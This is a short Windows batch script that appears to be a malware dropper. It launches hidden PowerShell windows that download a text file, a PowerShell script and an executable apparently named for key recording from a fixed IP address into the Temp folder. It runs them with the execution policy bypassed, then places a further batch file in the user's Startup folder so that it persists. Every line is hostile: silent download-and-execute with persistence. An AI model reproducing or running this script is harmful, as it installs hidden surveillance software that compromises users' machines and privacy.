@ECHO OFF
cd %userprofile%\AppData\Local\Temp
start PowerShell -windowstyle hidden (New-Object System.Net.WebClient).DownloadFile('http://192.168.1.133/Record2.txt','Record2.txt');(New-Object System.Net.WebClient).DownloadFile('http://192.168.1.133/smkscr.ps1','smkscr.ps1');(New-Object System.Net.WebClient).DownloadFile('http://192.168.1.133/krec.exe','krec.exe') 
start PowerShell -windowstyle hidden -ExecutionPolicy Bypass Start-Process 'krec.exe';.\smkscr.ps1;
cd "%userprofile%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
start PowerShell -windowstyle hidden (New-Object System.Net.WebClient).DownloadFile('http://192.168.1.133/pers.bat', 'pers.bat')

